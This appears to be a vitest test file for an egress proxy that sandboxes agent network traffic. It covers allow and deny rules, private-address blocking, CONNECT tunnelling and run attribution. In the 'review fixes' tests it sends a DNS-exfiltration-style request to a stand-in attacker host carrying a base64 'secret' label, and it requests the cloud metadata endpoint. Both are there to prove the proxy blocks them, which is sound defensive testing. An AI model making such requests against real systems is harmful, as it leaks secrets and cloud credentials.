/**
 * Tests for the cli egress proxy against real loopback servers: allow / deny / mode decisions, the
 * private-address guard (only an explicit IP rule lifts it), CONNECT tunnelling, per-run attribution,
 * and the proxy environment handed to agent processes.
 * @adr 0439
 */
import { createServer as createHttp, request, type Server } from "node:http";
import { connect, createServer as createTcp, type Server as TcpServer } from "node:net";
import { afterAll, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { egressProxyPort, isPrivateIp, splitHostPort, startEgressProxy, stopEgressProxy } from "./egress-proxy";
import { mintEgressToken, resetEgressStateForTest, setNetworkPolicy } from "./egress-state";
import { pendingEgressForTest, resetEgressEventsForTest } from "./egress-events";
import { egressEnv } from "./egress-env";

let web: Server;
let webPort = 0;
let echo: TcpServer;
let echoPort = 0;

/** A GET through the proxy; resolves status + body. */
function viaProxy(url: string, token?: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = request(
      {
        host: "127.0.0.1",
        port: egressProxyPort(),
        method: "GET",
        path: url,
        headers: token ? { "Proxy-Authorization": `Basic ${Buffer.from(`run:${token}`).toString("base64")}` } : {},
      },
      (res) => {
        let body = "";
        res.on("data", (c: Buffer) => (body += c.toString()));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body }));
      },
    );
    req.on("error", reject);
    req.end();
  });
}

/** A CONNECT through the proxy + one echo round-trip; resolves the status line and the echoed text. */
function tunnel(target: string): Promise<{ status: string; echoed: string }> {
  return new Promise((resolve, reject) => {
    const s = connect({ host: "127.0.0.1", port: egressProxyPort() }, () => s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
    let buf = "";
    let status = "";
    s.on("data", (c: Buffer) => {
      buf += c.toString();
      if (!status && buf.includes("\r\n\r\n")) {
        status = buf.split("\r\n")[0]!;
        buf = buf.slice(buf.indexOf("\r\n\r\n") + 4);
        if (status.includes(" 200 ")) s.write("ping");
        else {
          s.destroy();
          resolve({ status, echoed: "" });
        }
      } else if (status && buf.includes("ping")) {
        s.destroy();
        resolve({ status, echoed: "ping" });
      }
    });
    s.on("error", reject);
  });
}

beforeAll(async () => {
  web = createHttp((_req, res) => res.end("hello"));
  await new Promise<void>((r) => web.listen(0, "127.0.0.1", () => r()));
  webPort = (web.address() as { port: number }).port;
  echo = createTcp((sock) => sock.pipe(sock));
  await new Promise<void>((r) => echo.listen(0, "127.0.0.1", () => r()));
  echoPort = (echo.address() as { port: number }).port;
  await startEgressProxy();
});
afterAll(async () => {
  await stopEgressProxy();
  web.close();
  echo.close();
});
beforeEach(() => {
  resetEgressStateForTest();
  resetEgressEventsForTest();
});

/** Push a project policy. */
function policy(mode: "off" | "audit" | "enforce", allow: { target: string; port: number | null }[] = [], deny: { target: string; port: number | null }[] = []): void {
  setNetworkPolicy({ mode, allow, deny, orgDeny: [], projectId: "p1" });
}

describe("decisions", () => {
  it("blocks a private address in Enforce unless an IP rule names it", async () => {
    policy("enforce", [{ target: "*.example.com", port: null }]);
    expect((await viaProxy(`http://127.0.0.1:${webPort}/`)).status).toBe(403);
    policy("enforce", [{ target: "127.0.0.1", port: webPort }]);
    expect(await viaProxy(`http://127.0.0.1:${webPort}/`)).toEqual({ status: 200, body: "hello" });
  });

  it("denies a denylisted target even when it is allowed", async () => {
    policy("enforce", [{ target: "127.0.0.0/8", port: null }], [{ target: "127.0.0.1", port: webPort }]);
    const r = await viaProxy(`http://127.0.0.1:${webPort}/`);
    expect(r.status).toBe(403);
    expect(r.body).toContain("denylist");
    expect(pendingEgressForTest()[0]).toMatchObject({ decision: "denied", projectId: "p1" });
  });

  it("tunnels an allowed CONNECT and refuses a blocked one", async () => {
    policy("enforce", [{ target: "127.0.0.1", port: echoPort }]);
    expect(await tunnel(`127.0.0.1:${echoPort}`)).toEqual({ status: "HTTP/1.1 200 Connection Established", echoed: "ping" });
    policy("enforce");
    expect((await tunnel(`127.0.0.1:${echoPort}`)).status).toContain("403");
  });

  it("logs a run's connections under its run id", async () => {
    policy("enforce", [{ target: "127.0.0.1", port: webPort }]);
    await viaProxy(`http://127.0.0.1:${webPort}/`, mintEgressToken({ kind: "project", runId: "cmd-1", taskId: "TSK-0001-0001" }));
    expect(pendingEgressForTest()[0]).toMatchObject({ decision: "allowed", runId: "cmd-1", taskId: "TSK-0001-0001", count: 1 });
  });

  it("holds a project-less run to its strict policy", async () => {
    policy("enforce", [{ target: "127.0.0.1", port: webPort }]);
    const r = await viaProxy(`http://127.0.0.1:${webPort}/`, mintEgressToken({ kind: "projectless" }));
    expect(r.status).toBe(403);
  });
});

describe("helpers", () => {
  it("classifies private addresses", () => {
    for (const ip of ["10.1.2.3", "127.0.0.1", "169.254.169.254", "172.20.0.1", "192.168.1.1", "::1", "fd00::1", "::ffff:10.0.0.1"]) expect(isPrivateIp(ip)).toBe(true);
    for (const ip of ["8.8.8.8", "140.82.112.3", "2606:4700::1111"]) expect(isPrivateIp(ip)).toBe(false);
  });

  it("splits host:port forms", () => {
    expect(splitHostPort("github.com:22", 443)).toEqual({ host: "github.com", port: 22 });
    expect(splitHostPort("[::1]:8080", 443)).toEqual({ host: "::1", port: 8080 });
    expect(splitHostPort("x.com", 443)).toEqual({ host: "x.com", port: 443 });
    expect(splitHostPort("x.com:99999", 443)).toBeNull();
  });

  it("hands agent processes the proxy, loopback bypass and an ssh ProxyCommand", () => {
    const env = egressEnv({ GIT_SSH_COMMAND: "ssh -i /k" });
    expect(env.HTTPS_PROXY).toMatch(new RegExp(`^http://run:[^@]+@127\\.0\\.0\\.1:${egressProxyPort()}$`));
    expect(env.NO_PROXY).toBe("localhost,127.0.0.1,::1");
    expect(env.GIT_SSH_COMMAND).toBe('ssh -i /k -o ProxyCommand="4pm net-connect %h %p"');
    expect(env.CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC).toBe("1");
  });
});

describe("review fixes", () => {
  it("never resolves a name that may not pass (no DNS exfiltration through the proxy)", async () => {
    policy("enforce");
    const r = await viaProxy("http://c2VjcmV0.attacker.invalid/");
    expect(r.status).toBe(403);
    expect(r.body).toContain("not on the allowlist");
  });

  it("lets a private destination through in Audit (flagged), blocks it in Enforce, always blocks metadata", async () => {
    policy("audit");
    expect((await viaProxy(`http://127.0.0.1:${webPort}/`)).status).toBe(200);
    expect(pendingEgressForTest().at(-1)).toMatchObject({ decision: "would_block" });
    policy("enforce", [{ target: "127.0.0.1", port: null }]);
    expect((await viaProxy(`http://127.0.0.1:${webPort}/`)).status).toBe(200);
    policy("audit");
    expect((await viaProxy("http://169.254.169.254/latest/meta-data/")).status).toBe(403);
  });

  it("never stacks the proxy hop on repeated env builds", () => {
    const once = egressEnv({ GIT_SSH_COMMAND: "ssh -i /k", JAVA_TOOL_OPTIONS: "-Xmx1g" });
    const twice = egressEnv(once);
    expect(twice.GIT_SSH_COMMAND).toBe('ssh -i /k -o ProxyCommand="4pm net-connect %h %p"');
    expect((twice.JAVA_TOOL_OPTIONS ?? "").match(/https\.proxyHost/g)).toHaveLength(1);
    expect((twice.JAVA_TOOL_OPTIONS ?? "").startsWith("-Xmx1g")).toBe(true);
  });
});
